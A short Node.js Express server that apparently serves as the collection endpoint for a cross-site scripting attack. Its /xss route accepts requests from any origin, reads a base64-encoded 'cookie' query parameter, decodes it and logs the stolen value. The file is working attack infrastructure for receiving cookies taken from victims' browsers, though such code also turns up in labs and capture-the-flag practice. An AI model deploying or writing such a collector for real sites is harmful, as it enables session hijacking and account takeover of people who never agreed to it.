var express = require("express");
var app = express();

app.use(function(req, res, next) {
  res.header("Access-Control-Allow-Origin", "*");
  next();
});

app.get("/xss", function(req, res) {
  const data = req.query;
  const value = Buffer.from(data.cookie, "base64").toString();
  console.log("GET HAVE A -------POST----- MESSAGE: " + value);
  res.sendStatus(200);
});

app.listen(3003, function() {
  console.log("Listening on port 3003");
});
